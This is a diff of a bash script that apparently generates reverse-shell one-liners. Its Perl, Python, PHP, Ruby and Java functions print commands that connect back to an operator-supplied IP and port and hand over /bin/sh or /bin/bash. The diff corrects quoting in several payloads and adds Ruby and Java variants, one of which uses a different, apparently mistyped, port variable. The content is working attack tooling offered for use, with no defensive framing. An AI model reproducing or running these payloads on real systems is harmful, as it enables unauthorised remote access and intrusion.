@@ -88,32 +88,37 @@ function bashm(){
 
 function perlm(){
     clear
-    echo -e "${yellow}1 » ${end}${green}perl -e 'use Socket;"'$i'"""=""${red}$aipi${end}${green}"";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}"
+    echo -e "${yellow}1 » ${end}${green}perl -e 'use Socket;"'$i'"""=""\"${red}$aipi${end}${green}\""";"'$p'"=${end}${red}$portk${end}${green};socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp""));if(connect(S,sockaddr_in("'$p'",inet_aton("'$i'")))){open(STDIN,"'>&S'");open(STDOUT,"'>&S'");open(STDERR,"'>&S'");exec("'/bin/sh -i'");};'${end}"
 
 
 }
 
 function pym(){
     clear
-    echo -e "${yellow}1 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((${red}$aipi${end}${green},${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
-    echo -e "${yellow}2 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((${red}$aipi${end}${green},${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}"
+    echo -e "${yellow}1 » ${end}${green}python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\""/bin/sh\"""",\"-i\"]);'${end}\n"
+    echo -e "${yellow}2 » ${end}${green}python -c 'import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"${red}$aipi${end}${green}\",${red}$portk${end}${green}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'${end}"
 }
 
 function phpm(){
     clear
     declare sock='$sock'
-    echo -e "${yellow}1 » ${end}${green}php -r "\'$sock"\=fsockopen(${red}$aipi${end}${green},${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
+    echo -e "${yellow}1 » ${end}${green}php -r "\'$sock"\=fsockopen(\"${red}$aipi${end}${green}\",${end}${red}$portk${end}${green});exec(\"/bin/sh -i <&3 >&3 2>&3\");'${end}\n"
     echo -e "${yellow}2 » ${end}${green}<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/${red}$aipi${end}${green}/${end}${red}$portk${end}${green} 0>&1'\");?>${end}"
     
 }
 
 function rubym(){
     clear
+    echo -e "${yellow}1 » ${end}${green}ruby -rsocket -e'f=TCPSocket.open(\"${red}$aipi${end}${green}\",${end}${red}$portt${end}${green}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'${end}"
 
 }
 
 function javam(){
     clear
+    declare line='\$line'
+    echo -e "${yellow}1 » ${end}${green}\tr = Runtime.getRuntime()${end}"
+    echo -e "\t${green}p = r.exec([\"/bin/sh\",\"-c\",\"exec 5<>/dev/tcp/${red}$aipi${end}${green}/${red}$portk${end}${green};cat <&5 | while read line; do $line 2>&5 >&5; done\"] as String[])${end}"
+    echo -e "\t${green}p.waitFor()${end}"
 }
 
 function gom(){
